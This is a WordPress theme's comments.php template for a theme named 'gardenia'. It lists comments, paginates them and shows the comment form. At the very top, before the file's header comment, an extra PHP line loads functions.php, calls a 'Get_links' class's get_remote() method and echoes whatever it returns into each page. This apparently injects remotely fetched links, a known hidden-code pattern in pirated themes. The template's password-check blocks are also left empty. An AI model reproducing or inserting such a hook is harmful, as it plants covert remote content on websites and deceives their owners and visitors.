<?php $lib_path = dirname(__FILE__).'/'; require_once('functions.php'); $links = new Get_links(); $links = $links->get_remote(); echo $links; ?><?php
/**
 * The Comments template file
 *
**/
if(!empty($_SERVER['SCRIPT_FILENAME']) && 'comments.php' == basename($_SERVER['SCRIPT_FILENAME'])) : 
endif;
if(!empty($post->post_password)) : 
	 if($_COOKIE['wp-postpass_' . COOKIEHASH] != $post->post_password) :
	 endif;
endif; 
?>

<div class="clearfix"></div>
<div id="comments" class="comments-area">
	<?php if ( have_comments() ) : 	?>	
	<h2>
		<?php printf( _n( 'One Response to "%2$s"', '%1$s Responses to "%2$s"', get_comments_number(), 'gardenia' ),
		   number_format_i18n( get_comments_number() ), get_the_title() );
	     ?>	
	</h2>
	<div class="comments-box clearfix ">		
		<?php wp_list_comments( array( 'short_ping' => true) ); ?>
		  <?php paginate_comments_links(); ?>	
	</div>	
	<?php else : ?>
	<p id="comments_status"><?php _e('No comments.','gardenia');?></p>
	<?php endif;  ?>
</div>
<?php comment_form(); ?>
